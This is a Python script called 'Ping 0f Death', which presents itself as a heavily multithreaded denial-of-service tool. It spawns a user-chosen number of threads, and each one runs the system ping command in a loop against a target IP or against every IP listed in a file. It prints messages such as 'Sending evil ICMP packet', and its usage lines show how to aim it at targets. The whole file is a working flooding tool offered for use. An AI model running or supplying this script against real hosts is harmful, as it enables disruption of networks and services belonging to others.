#!/usr/bin/python3
# ======================
# Ping 0f Death (PoD.py)
# http://github.com/34zY
# Author : 34zY
# ======================
# HEAVILY multithreaded dos ping tool
import os,sys,threading,subprocess,time

# wireshark
# python PoD.py -i 127.0.0.1 -t 250
# wireshark --> reset

# type hosts.txt
# python PoD.py -l hosts.txt -t 5
# wireshark


# take n_threads_user fill the array in i range of n_threads_user
# numbers_threadz[i] = i{n_threads_user}
numbers_threadz = []

# === Style === #
class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def banner():
	print(style.BOLD+style.BLACK+'''

            ;....;                           
           ;....; .;                /\          
         ;.....'   .;              / /         
        ;.....;     ;.           /VVV\            
       ,.....'       ;          /VVVVV\         
       ......;       ;         /VVVVVVV\       
       ;.....;       ;         VVVVVVVVV\       
      ,;......;     ;'         / VVVVVVVVV      
    ;.........`. ,,,;.        / /  DVVVVVVV   
  .';.................;,     / /     DVVVVVV   
 ,......;......;;;;....;,   / /        DVVVVV  
;`......`'......;;;..... ,#/ /          DVVVVV
.`.......`;......;;... ;..# /            DVVVVV
..`.......`;........ ;....#/              DVVVV
`.`.......`;...... ;......#                DVVV
 ...`.......`;; ;.........##                VVV
 ....`.......`;........;...#                VVV
 `.....`............;'`.;..#                VV
  `.....`........;' /  / `.#                V  
   ......`.....;'  /  /   `#              
'''+style.RESET+style.RED+'''██▓███   ▒█████  ▓█████▄
▓██░  ██▒▒██▒  ██▒▒██▀ ██▌  ''' + style.RESET + '''| Ping 0f Death '''+style.RED+''' 
▓██░ ██▓▒▒██░  ██▒░██   █▌  ''' + style.RESET + '''| HEAVILY Multithreaded DOS Tool'''+style.RED+'''
▒██▄█▓▒ ▒▒██   ██░░▓█▄   ▌  ''' + style.RESET + '''| Github : http://github.com/34zY'''+style.RED+'''
▒██▒ ░  ░░ ████▓▒░░▒████▓ 
▒▓▒░ ░  ░░ ▒░▒░▒░  ▒▒▓  ▒ 
░▒ ░       ░ ▒ ▒░  ░ ▒  ▒ 
░░   ░   ░ ░ ░ ▒   ░ ░  ░ 
░    ░       ░ ░     ░  ░  
░            ░     ░ ░
                   ░ 
	 ''' + style.RESET)

def help():
	print("""___________________________________________________

Usage: python PoD.py -i <Target IP> -t  <Threads>\n       python PoD.py -l <IP File>   -t  <Threads>
___________________________________________________
		

		/!\ Don't put too much threads when using the list option this may crash the script
		             For each IP there is one the numbers of thread insterted
		"""+style.RESET)

def PoD(IP):
	# Test threads
	# print(IP)
	if os.name == 'nt':

		ping = subprocess.Popen(
			["ping", IP, "-t"], # -t no limit windows
			stdout = subprocess.PIPE,
			stderr = subprocess.PIPE)
	
		out, error = ping.communicate()
		#print(out)
	
		#print("started!!!!")
		#print(style.GREEN+"[+]"+style.RESET+" Job done.")
	else:
		ping = subprocess.Popen(["ping", IP],stdout = subprocess.PIPE,stderr = subprocess.PIPE)
		out, error = ping.communicate()

def _3vil_buffer(IP, n_threads_user):

	#print(n_threads_user)
	n_threads_user = int(n_threads_user)

	for var in range(0, n_threads_user):
		#print(f"t{var}")
		numbers_threadz.append("t" + str(var))
		pass
	
	#print(numbers_threadz[:])
	try:
		for i in numbers_threadz:
			print(style.GREEN+"[+]"+style.RESET+f" {i} threads started.", end="\r")			
			#time.sleep(0.1)
			i = threading.Thread(target=PoD, args=(IP,))
			i.start()

		print(style.RED+"[+]"+style.RESET+f" Sending evil ICMP packet with {n_threads_user} threads on {IP} ... ")
		#print(style.GREEN+"[+]"+style.RESET+f" on {IP} ... ")

	except KeyboardInterrupt:
		print(style.RED+"[!]"+style.RESET+" PoD Stopped.")
		sys.exit()

def main():
	if sys.argv[1] == '-h':
		help()

	elif sys.argv[1] == '-i' and sys.argv[3] == '-t':

		IP = sys.argv[2]
		n_threads_user = sys.argv[4]

		if int(n_threads_user) > 0:
			#print(IP)
			print(style.YELLOW+"[?]"+style.RESET+f" {IP} set to {n_threads_user} threads.")
			_3vil_buffer(IP, n_threads_user)
			sys.exit()

		else:
			print(style.RED+"[!]"+style.RESET+" You must a numbers of threads greater than 0.")

	elif sys.argv[1] == '-l' and sys.argv[3] == '-t':
		try:
			f_name = sys.argv[2]
			n_threads_user = sys.argv[4]		
			
			if int(n_threads_user) > 0:
				
				f = open(f_name)
				f_content = f.read()
				f_content = f_content.replace(" ", "")
				f_content = f_content.split()
				f.close()
				#print(f_content)			
				
				for ip in f_content:
					#print(ip)						
					print(style.YELLOW+"[?]"+style.RESET+ f" {ip} set to {n_threads_user} threads.")				
					_3vil_buffer(ip, n_threads_user)

				print(style.GREEN+"[+]"+style.RESET+" Job started, waiting to finish.")
			else:
				print(style.RED+"\n[!]"+style.RESET+" You must a numbers of threads greater than 0.")

		except:
			print(style.RED+"[!]"+style.RESET+" An error occuried.")
	
	else:
		print("ERROR")
if __name__ =="__main__":
	banner()
	try:
		main()
		#print(style.GREEN+"[+]"+style.RESET+" Job started, waiting to finish.")
	except:
		help()

